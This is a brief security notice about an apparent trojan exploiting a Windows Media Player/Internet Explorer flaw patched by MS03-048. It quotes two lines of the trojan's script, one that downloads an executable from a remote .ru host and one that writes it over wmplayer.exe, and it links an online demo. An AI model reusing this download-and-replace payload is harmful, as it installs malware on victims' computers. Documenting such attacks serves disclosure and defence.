This is a lame trojan? trying to exploit the Windows Media Player/Internet Explorer vulnerability (greetz to Liu Die Yu)

x.Open("GET", "http://www.****.ru/dan/updatte.exe",0);
[...]
s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);  

Online Demo : http://www.k-otik.com/WMPLAYER-TEST/

Vulnerability fixed with MS03-048 BID (8577, 9013, 9014, 9015).
